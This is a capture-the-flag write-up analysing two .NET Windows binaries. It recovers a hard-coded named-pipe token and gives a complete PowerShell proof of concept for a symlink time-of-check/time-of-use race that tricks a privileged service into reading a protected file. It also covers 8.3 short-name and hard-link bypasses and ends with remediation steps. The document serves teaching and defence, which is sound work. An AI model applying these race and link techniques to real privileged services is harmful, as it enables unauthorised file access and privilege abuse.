# Operation Shadow Backup — Detailed Write-up

## Challenge summary

The challenge contains two Windows x64 executables:

- `BackupCLI.exe`: an unprivileged command-line client.
- `ShadowService.exe`: a privileged helper that reads files for authenticated
  clients over a local named pipe.

The service attempts to prevent access to `ProtectedSandboxFlag.txt`. Its path
authorization is performed on a string, however, and the authorized path is
opened only after a deliberate 2.5-second delay. An attacker can submit a benign
file called `allowed.txt`, wait for the service to approve it, and replace that
file with a symbolic link to the protected flag before the privileged open.

The supplied [solve.ps1](solve.ps1) automates the complete attack.

## Result at a glance

The important recovered constants are:

| Item | Value |
|---|---|
| Named pipe | `\\.\pipe\ShadowBackupPipe` |
| Authentication message | `AUTH ShadowBackup_SecretToken_2026!` |
| File request | `GET <path>` |
| Protected filename | `ProtectedSandboxFlag.txt` |
| Special allowed basename | `allowed.txt` |
| Race window | 2,500 milliseconds |

The main exploit sequence is:

1. Create a normal, attacker-controlled `%TEMP%\...\allowed.txt`.
2. Authenticate to `ShadowBackupPipe` with the token embedded in the client.
3. Send `GET C:\Users\...\AppData\Local\Temp\...\allowed.txt`.
4. Wait until the service replies `OK: Processing...`. At that point validation
   is finished and the service has entered its 2.5-second sleep.
5. Delete the normal file and create a file symbolic link at the same path. Point
   the link to the real `ProtectedSandboxFlag.txt`.
6. The privileged service follows the new link and returns `OK:<flag>`.

## Files and hashes

The original archive contains two self-contained .NET executables:

```text
11c0ec282d06ada9278fe4c387cb6dbfc8b0396f5d457816f1526d92bb3ebb03  BackupCLI.exe
af6537a2f19901522f862a9fa73dbacb8400991cb6b9af100fa41b4667a1f8ff  ShadowService.exe
```

Verify them from Linux with:

```bash
sha256sum ctf_player_files/BackupCLI.exe \
          ctf_player_files/ShadowService.exe
```

Both files identify as Windows PE32+ x64 console programs:

```bash
file ctf_player_files/*.exe
```

Expected output includes:

```text
PE32+ executable for MS Windows ... console, x86-64
```

## Static analysis

### 1. Identify the .NET single-file bundles

The executables are approximately 67 MB each, which is much larger than the
challenge-specific code. Running `strings` shows embedded .NET runtime files,
including:

```text
BackupCLI.dll
BackupCLI.runtimeconfig.json
BackupCLI.deps.json
ShadowService.dll
ShadowService.runtimeconfig.json
ShadowService.deps.json
System.IO.Pipes.dll
```

This indicates that both programs were published as self-contained .NET 8
single-file bundles. Most strings in the outer executables are framework noise;
the useful code is in the small embedded application DLLs.

A quick confirmation command is:

```bash
strings -a ctf_player_files/ShadowService.exe |
  grep -E 'ShadowService\.dll|runtimeconfig|System\.IO\.Pipes'
```

### 2. Locate the bundle manifest

.NET app hosts contain this 32-byte bundle marker:

```text
8b1202b96a612038727b930214d7a03213f5b9e6efae3318ee3b2dce24b36aae
```

The eight bytes immediately before the marker contain the little-endian file
offset of the bundle header. The following Python snippet finds it without
modifying either executable:

```bash
python3 - <<'PY'
from pathlib import Path
import struct

marker = bytes.fromhex(
    "8b1202b96a612038727b930214d7a032"
    "13f5b9e6efae3318ee3b2dce24b36aae"
)

for name in ("BackupCLI.exe", "ShadowService.exe"):
    path = Path("ctf_player_files") / name
    data = path.read_bytes()
    marker_offset = data.find(marker)
    header_offset = struct.unpack_from("<Q", data, marker_offset - 8)[0]
    print(name)
    print(f"  marker:  0x{marker_offset:x}")
    print(f"  header:  0x{header_offset:x}")
PY
```

For these exact samples, the relevant values are:

| Executable | Marker offset | Bundle-header offset |
|---|---:|---:|
| `BackupCLI.exe` | `0x795228` | `0x4063180` |
| `ShadowService.exe` | `0x795228` | `0x406318c` |

Examining either manifest with `xxd` reveals the application assembly entry,
its file offset, and its size. For example:

```bash
xxd -g1 -s 0x406318c -l 160 ctf_player_files/ShadowService.exe
```

The two application assemblies are:

| Assembly | Embedded offset | Size |
|---|---:|---:|
| `BackupCLI.dll` | `0x932000` | `0x1400` bytes |
| `ShadowService.dll` | `0x932000` | `0x1a00` bytes |

### 3. Extract the application assemblies

Create an output directory and carve the exact ranges:

```bash
mkdir -p extracted

dd if=ctf_player_files/BackupCLI.exe \
   of=extracted/BackupCLI.dll \
   bs=1 skip=$((0x932000)) count=$((0x1400)) status=none

dd if=ctf_player_files/ShadowService.exe \
   of=extracted/ShadowService.dll \
   bs=1 skip=$((0x932000)) count=$((0x1a00)) status=none
```

Verify the resulting files:

```bash
file extracted/*.dll
sha256sum extracted/*.dll
```

Expected hashes:

```text
3bbf0d781cce6314b2f901bc297913b360aa6e197fac259cc2d2866dc4ef9839  BackupCLI.dll
de5297861c3a0365b34200b7943b462775990508ef4a2154869fd63c967a63d1  ShadowService.dll
```

`file` should now explicitly identify both as Mono/.NET assemblies.

### 4. Recover the hard-coded token with strings

The application strings alone reveal most of the protocol:

```bash
strings -a -el extracted/BackupCLI.dll
strings -a -el extracted/ShadowService.dll
```

Relevant client strings include:

```text
Usage: BackupCLI.exe <filepath>
ShadowBackupPipe
AUTH ShadowBackup_SecretToken_2026!
GET
OK: Processing...
```

Relevant service strings include:

```text
AUTH
ShadowBackup_SecretToken_2026!
OK: Authenticated.
GET
ProtectedSandboxFlag.txt
FAIL: Access denied.
FAIL: File not allowed.
OK: Processing...
```

The authentication token is therefore not a security boundary. Any local user
who can read `BackupCLI.exe` can recover it.

### 5. Decompile the assemblies

Install ILSpy's command-line decompiler in a temporary directory:

```bash
DOTNET_CLI_HOME=/tmp/shadow-dotnet \
dotnet tool install ilspycmd \
  --tool-path /tmp/shadow-tools \
  --version 8.2.0.7535
```

Decompile both assemblies:

```bash
DOTNET_CLI_HOME=/tmp/shadow-dotnet \
/tmp/shadow-tools/ilspycmd extracted/BackupCLI.dll

DOTNET_CLI_HOME=/tmp/shadow-dotnet \
/tmp/shadow-tools/ilspycmd extracted/ShadowService.dll
```

The exact formatting emitted by ILSpy can vary, but the control flow and
constants below should match.

## Reconstructed protocol

`BackupCLI.exe` creates a bidirectional named-pipe connection to the local
machine:

```csharp
new NamedPipeClientStream(
    ".",
    "ShadowBackupPipe",
    PipeDirection.InOut
);
```

After connecting, it sends two newline-terminated requests:

```csharp
writer.WriteLine("AUTH ShadowBackup_SecretToken_2026!");
writer.WriteLine("GET " + requestedPath);
```

The normal exchange is:

```text
Client: AUTH ShadowBackup_SecretToken_2026!
Server: OK: Authenticated.
Client: GET Evidence\allowed.txt
Server: OK: Processing...
Server: OK:<contents of the requested file>
```

There is no message length, binary framing, nonce, challenge-response step, or
per-user secret. `StreamReader.ReadLine()` and `StreamWriter.WriteLine()` provide
all framing.

## Vulnerable service logic

The service determines its working directory from the executable's application
base directory:

```csharp
string workingDir = AppContext.BaseDirectory;
string evidenceAllowedPath = Path.Combine(
    workingDir,
    "Evidence",
    "allowed.txt"
);
```

After authentication, its `GET` handler is equivalent to:

```csharp
string requestedPath = request.Substring("GET ".Length);
string fullPath = Path.GetFullPath(
    Path.Combine(workingDir, requestedPath)
);

if (fullPath.Contains(
        "ProtectedSandboxFlag.txt",
        StringComparison.OrdinalIgnoreCase))
{
    writer.WriteLine("FAIL: Access denied.");
    return;
}

string fileName = Path.GetFileName(fullPath);

if (!fileName.Equals(
        "allowed.txt",
        StringComparison.OrdinalIgnoreCase) &&
    !fullPath.StartsWith(
        workingDir,
        StringComparison.OrdinalIgnoreCase))
{
    writer.WriteLine("FAIL: File not allowed.");
    return;
}

writer.WriteLine("OK: Processing...");
Thread.Sleep(2500);

if (File.Exists(fullPath))
{
    string content = File.ReadAllText(fullPath);
    writer.WriteLine("OK:" + content);
}
else
{
    writer.WriteLine("FAIL: File not found.");
}
```

After a request whose final component is `allowed.txt`, the service also tries to
restore the legitimate evidence file:

```csharp
File.WriteAllText(evidenceAllowedPath, "Sample backup log data.");
```

That restoration does not protect the flag. It always writes to
`<service directory>\Evidence\allowed.txt`, whereas the exploit uses an absolute
`allowed.txt` beneath the attacker's temporary directory.

## Root-cause analysis

### Hard-coded authentication secret

The client contains the exact token required by the server. Because the client
runs as an unprivileged user, extracting the token requires only `strings` or a
.NET decompiler. Authentication therefore prevents neither reverse engineering
nor malicious requests from a local user.

### Unsafe basename exception

The authorization condition uses `&&`:

```csharp
if (basename != "allowed.txt" && pathIsOutsideWorkingDirectory)
    deny();
```

Consequently, either of the following is sufficient for authorization:

- The path appears to be inside the service working directory; or
- The final path component equals `allowed.txt`, even if the path is outside the
  service directory.

An absolute path such as this is accepted:

```text
C:\Users\player\AppData\Local\Temp\shadow-race\allowed.txt
```

The service does not require it to be the legitimate
`Evidence\allowed.txt`.

### Lexical validation does not identify the opened object

`Path.GetFullPath()` performs string normalization. It does not resolve NTFS
reparse points and does not provide a stable handle to the underlying file.

The service therefore approves the text:

```text
C:\Users\player\...\allowed.txt
```

but `File.ReadAllText()` may ultimately open the link target:

```text
C:\...\ProtectedSandboxFlag.txt
```

The blacklist examines only the first string. The protected filename never
appears in the submitted request.

### Time-of-check/time-of-use race

The service explicitly waits 2.5 seconds between authorization and the file
open:

```text
validate path
    |
    +---- reply "OK: Processing..."
    |
    +---- sleep 2.5 seconds
    |
    +---- File.Exists(path)
    |
    +---- File.ReadAllText(path)
```

The server reply provides a precise synchronization point. The exploit does not
have to guess when validation has completed: it swaps the file immediately after
receiving `OK: Processing...`.

No file handle is retained between validation and use, so deleting and replacing
the pathname changes the object the privileged process opens.

### Additional weaknesses

The working-directory check is also a raw string-prefix comparison:

```csharp
fullPath.StartsWith(workingDir, OrdinalIgnoreCase)
```

It does not append or verify a directory separator. If `workingDir` were
`C:\Tools\Shadow`, a sibling such as `C:\Tools\ShadowOwned\file.txt` would share
the prefix and could pass the test. This is not required by the primary exploit,
but it is another reason the path check is unsafe.

The filename blacklist can potentially be bypassed with an NTFS 8.3 short name,
as described later in this document.

## Exploitation prerequisites

The primary PoC assumes:

1. `ShadowService.exe` is running and the current user can connect to
   `ShadowBackupPipe`.
2. The location of `ProtectedSandboxFlag.txt` is known or can be inferred from
   the service executable directory.
3. The account can create file symbolic links. On modern Windows this normally
   means Developer Mode is enabled or the process has
   `SeCreateSymbolicLinkPrivilege`.
4. The protected file exists and is readable by the privileged service account.

The attacker does **not** need permission to read the flag directly. The
privileged service follows the symbolic link and performs the read.

## Locating the protected file

The challenge normally places the protected file beside the service executable.
First inspect the running process:

```powershell
Get-CimInstance Win32_Process -Filter "Name = 'ShadowService.exe'" |
    Select-Object ProcessId, ExecutablePath, CommandLine
```

If `ExecutablePath` is visible:

```powershell
$proc = Get-CimInstance Win32_Process `
    -Filter "Name = 'ShadowService.exe'" |
    Select-Object -First 1

$serviceDir = Split-Path -Parent $proc.ExecutablePath
$flagPath = Join-Path $serviceDir 'ProtectedSandboxFlag.txt'
$flagPath
```

If it is installed as a Windows service, inspect its configuration:

```powershell
Get-CimInstance Win32_Service |
    Where-Object { $_.PathName -match 'ShadowService\.exe' } |
    Select-Object Name, StartName, State, PathName
```

The command-line alternative is:

```cmd
sc.exe query type= service state= all
sc.exe qc <discovered-service-name>
```

Do not treat a failed unprivileged `Test-Path` as proof that the flag is absent.
The file's ACL may intentionally prevent the current user from querying it while
still permitting the service account to read it.

## Automated exploitation

### 1. Copy the solver to the Windows challenge host

Use [solve.ps1](solve.ps1) from this directory. It performs the following safety
and reliability steps:

- Creates a unique directory beneath `%TEMP%`.
- Verifies that file-symlink creation works before starting the request.
- Creates a benign `allowed.txt`.
- Authenticates directly to the named pipe.
- Waits for the service's post-validation response.
- Swaps the benign file for the flag symlink.
- Prints the content after the `OK:` prefix.
- Removes the temporary link and files in a `finally` block.

### 2. Run with automatic path discovery

From PowerShell:

```powershell
.\solve.ps1
```

If local execution policy blocks the script in the disposable CTF environment:

```powershell
powershell.exe -NoProfile -ExecutionPolicy Bypass -File .\solve.ps1
```

### 3. Run with an explicit target

If querying the process path is restricted, supply the path yourself:

```powershell
.\solve.ps1 `
  -FlagPath 'C:\Program Files\Shadow Backup\ProtectedSandboxFlag.txt'
```

Replace the example directory with the actual service directory.

### 4. Expected output

On success, the script prints only the content returned after `OK:`:

```text
flag{...}
```

The flag value cannot be recovered from the two offline executables. It exists in
the protected file on the live Windows challenge host, so the final step must be
executed in that environment.

## Manual PowerShell reproduction

The following expanded version demonstrates each protocol and race step. Set
`$flagPath` first if the challenge uses a different installation directory.

```powershell
$ErrorActionPreference = 'Stop'

# Change this to the actual target path.
$flagPath = 'C:\Path\To\ProtectedSandboxFlag.txt'

# Prepare a benign path whose final component satisfies the service exception.
$raceDir = Join-Path $env:TEMP (
    'shadow-manual-' + [Guid]::NewGuid().ToString('N')
)
$approvedPath = Join-Path $raceDir 'allowed.txt'

New-Item -ItemType Directory -Path $raceDir | Out-Null
Set-Content -LiteralPath $approvedPath -Value 'benign' -NoNewline

# Connect to the named pipe.
$pipe = [System.IO.Pipes.NamedPipeClientStream]::new(
    '.',
    'ShadowBackupPipe',
    [System.IO.Pipes.PipeDirection]::InOut
)
$pipe.Connect(5000)

$reader = [System.IO.StreamReader]::new($pipe)
$writer = [System.IO.StreamWriter]::new($pipe)
$writer.AutoFlush = $true

try {
    # Recoverable directly from BackupCLI.dll/BackupCLI.exe.
    $writer.WriteLine('AUTH ShadowBackup_SecretToken_2026!')
    $authReply = $reader.ReadLine()
    Write-Host "Auth reply: $authReply"

    if ($authReply -ne 'OK: Authenticated.') {
        throw 'Authentication failed'
    }

    # This absolute path is outside the service root, but its basename is allowed.
    $writer.WriteLine("GET $approvedPath")
    $checkReply = $reader.ReadLine()
    Write-Host "Validation reply: $checkReply"

    if ($checkReply -ne 'OK: Processing...') {
        throw 'The service rejected the chosen path'
    }

    # The service is sleeping for 2.5 seconds now. Replace the checked object.
    Remove-Item -LiteralPath $approvedPath -Force
    New-Item `
        -ItemType SymbolicLink `
        -Path $approvedPath `
        -Target $flagPath | Out-Null

    # The privileged read occurs after the replacement.
    $result = $reader.ReadLine()
    Write-Host "Raw service result: $result"

    if ($null -ne $result -and $result.StartsWith('OK:')) {
        $flag = $result.Substring(3)
        Write-Host "Flag: $flag"
    }
}
finally {
    $writer.Dispose()
    $reader.Dispose()
    $pipe.Dispose()

    # Removing a symbolic-link pathname removes the link, not the target file.
    Remove-Item -LiteralPath $approvedPath -Force `
        -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $raceDir -Force `
        -ErrorAction SilentlyContinue
}
```

## Why the symbolic-link target is not caught

The request sent over the pipe contains only the harmless link pathname:

```text
GET C:\Users\player\AppData\Local\Temp\shadow-race-123\allowed.txt
```

The submitted string satisfies every service check:

- It does not contain `ProtectedSandboxFlag.txt`.
- `Path.GetFileName(...)` returns `allowed.txt`.
- Because the basename matches, it does not matter that the path is outside the
  service working directory.

The sensitive path exists only inside the NTFS reparse-point metadata created
after validation. `File.ReadAllText()` follows that metadata during the later
open, under the service identity.

## Short 8.3-name bypass

If NTFS 8.3 filename generation is enabled and the flag is inside the service
working directory, the blacklist may be bypassed without a race.

Inspect aliases from the service directory:

```cmd
dir /x
```

`ProtectedSandboxFlag.txt` will commonly have an alias resembling:

```text
PROTEC~1.TXT
```

Then try:

```powershell
.\BackupCLI.exe PROTEC~1.TXT
```

Why this works:

1. `Path.GetFullPath()` normally preserves the short component as
   `PROTEC~1.TXT` instead of expanding it to the long name.
2. The blacklist searches only for the literal long filename, so it does not
   match.
3. The path appears to remain within `AppContext.BaseDirectory`, satisfying the
   prefix condition.
4. `File.ReadAllText()` asks Windows to open the path, and NTFS resolves the short
   name to `ProtectedSandboxFlag.txt`.

This shortcut is environment-dependent:

- The volume may have 8.3-name creation disabled.
- The file may have no short alias.
- The number may be `~2`, `~3`, or another value because of naming collisions.
- The flag may be outside the service working directory.

Use `dir /x` rather than assuming the exact alias. The symlink race is the more
general exploit when its prerequisites are available.

## Other link strategies

### Pre-created symbolic link

The service never checks whether the submitted path is already a reparse point.
Therefore, in the shown implementation, a link can often be created before the
request:

```powershell
$link = Join-Path $env:TEMP 'allowed.txt'
New-Item -ItemType SymbolicLink -Path $link -Target $flagPath
.\BackupCLI.exe $link
```

The timed replacement remains preferable for demonstrating the TOCTOU flaw and
for environments containing an external pre-validation check.

### Hard link

If file symbolic links are unavailable, an NTFS hard link may be worth testing:

```powershell
New-Item `
  -ItemType HardLink `
  -Path "$env:TEMP\allowed.txt" `
  -Target $flagPath
```

Then request the new `allowed.txt`. This is less portable because:

- Source and destination must be on the same volume.
- Current Windows hard-link policy and the flag's ACL may prevent creation.
- A hard link references the same file object rather than acting as a reparse
  point.

Failure of this alternative does not disprove the primary symbolic-link attack.

## Troubleshooting

### `File symlink creation failed`

The current account cannot create file symbolic links. Check Developer Mode or
the relevant privilege:

```cmd
whoami /priv
```

Look for `SeCreateSymbolicLinkPrivilege`. In a challenge VM, Developer Mode may
already be intended. If changing the VM configuration is outside the challenge
rules, try the 8.3 or hard-link alternatives instead.

### Pipe connection timeout

Typical exception:

```text
The operation has timed out
```

Confirm that `ShadowService.exe` is running:

```powershell
Get-Process ShadowService -ErrorAction SilentlyContinue
```

Also verify that the solver is running on the same Windows host. The client uses
`.` as the named-pipe server and does not connect to a remote machine.

### `FAIL: Invalid auth format.`

The first line must begin with `AUTH `, including the trailing space. The solver
uses the exact expected message.

### `FAIL: Invalid token.`

Use the complete token, including punctuation:

```text
ShadowBackup_SecretToken_2026!
```

### `FAIL: Access denied.`

The submitted request string itself contains `ProtectedSandboxFlag.txt`. Do not
send the protected path directly. Send only the attacker-controlled link path
ending in `allowed.txt`.

### `FAIL: File not allowed.`

For an absolute path outside the service directory, its final component must be
exactly `allowed.txt`, compared case-insensitively. Ensure there are no trailing
characters and that the path sent to the pipe is the absolute link pathname.

### `FAIL: File not found.`

Likely causes include:

- The link replacement missed the 2.5-second window.
- Symbolic-link creation silently failed.
- The supplied flag target is incorrect.
- The service cannot resolve the target under its own environment.

The supplied solver swaps immediately after `OK: Processing...`, leaving most of
the 2.5-second window available.

### `FAIL: Internal error.`

The service caught an exception during path handling or file access. Check for an
invalid target path, malformed path syntax, or a target the service identity also
cannot read.

### The script cannot discover `ShadowService.exe`

Pass the path explicitly:

```powershell
.\solve.ps1 -FlagPath 'C:\known\path\ProtectedSandboxFlag.txt'
```

The automatic lookup is only a convenience and is not part of the vulnerability.

## Verification performed during analysis

The following checks were completed against the supplied files:

- Both embedded application assemblies were carved and identified as valid .NET
  assemblies.
- Their SHA-256 hashes match the values documented above.
- Both were decompiled successfully with ILSpy.
- The token, pipe name, blacklist string, basename exception, and 2.5-second
  delay were confirmed in the service code.
- `solve.ps1` was parsed by PowerShell with no syntax errors.
- The complete solver was exercised against a local mock named-pipe service. It
  authenticated, submitted the approved path, replaced the file after the
  processing response, and received content through the symbolic link.

The actual challenge flag was not present in the offline archive, so obtaining
the flag itself requires executing the final PoC against the live Windows
service.

## Remediation

Removing the `Thread.Sleep()` would make the race less convenient but would not
fix the vulnerability. The authorization decision must apply to the same file
object that is ultimately read.

A robust design should:

1. Remove the basename-based exception. If one evidence file is allowed, compare
   against its exact intended location rather than accepting every file with the
   same basename.
2. Avoid blacklist authorization. Define an allowlisted root and allowed objects.
3. Perform component-by-component, handle-based traversal from an already opened
   trusted directory.
4. Reject unexpected reparse points or explicitly constrain where they may
   resolve.
5. Verify the final path represented by the opened handle remains within the
   authorized root.
6. Read through that already validated handle; do not validate one path and then
   reopen it by name.
7. If a string boundary check is retained as defense in depth, normalize the
   root with a directory separator and use proper relative-path APIs rather than
   a raw `StartsWith` test.
8. Restrict the named pipe with an ACL appropriate to the intended client users.
9. Authenticate the caller using Windows identity/pipe impersonation where
   appropriate instead of relying on a token embedded in a readable client.
10. Keep secrets out of client binaries and rotate the exposed token.

The essential rule is: authorize and consume the same stable file handle, not
two separate resolutions of a mutable pathname.
